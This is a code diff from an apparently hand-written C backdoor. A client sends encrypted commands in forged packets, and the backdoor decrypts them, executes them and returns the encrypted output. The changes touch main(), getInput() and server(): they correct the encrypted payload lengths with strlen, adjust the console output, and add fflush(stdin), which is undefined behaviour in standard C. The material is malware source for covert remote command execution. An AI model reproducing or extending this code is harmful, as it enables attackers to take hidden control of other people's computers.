@@ -91,7 +91,6 @@ int main(int argc, char **argv)
 
     if (backdoor == 0)
     {
-        fprintf(stdout, "Client..\n");
         int cypher_len = 0;
         unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
         char *command;
@@ -104,7 +103,7 @@ int main(int argc, char **argv)
                 more = false;
             else
             {
-                cypher_len = forgepacket(ciphertext, command, BUFF_SIZE);
+                cypher_len = forgepacket(ciphertext, command, strlen(command));
                 client(source_host, dest_host, dest_port, ciphertext, cypher_len);
 
                 fprintf(stdout, "\nListen from Backdoor..\n\n");
@@ -156,6 +155,7 @@ char *getInput()
 
     fprintf(stdout, "\nEnter Command: ");
     fgets(commandBuffer, BUFF_SIZE, stdin);
+    fflush(stdin);
 
     return commandBuffer;
 }
@@ -343,7 +343,9 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                     char *decryptedtext = (char *)malloc(size);
                     decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
 
-                    fprintf(stdout, "Decypher Command: \n%s\n\n", decryptedtext);
+                    fprintf(stdout, "\n------------------------\n");
+                    fprintf(stdout, "\nDecypher Command: \n%s\n", decryptedtext);
+                    fprintf(stdout, "\n------------------------\n\n");
 
                     // if Backdoor EXECUTE command
                     if (isBackdoor)
@@ -354,7 +356,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                         // Cypher
                         unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
-                        int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
+                        int cypher_len = forgepacket(ciphertext, output, strlen(output));
                         // Send
                         client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
                     }
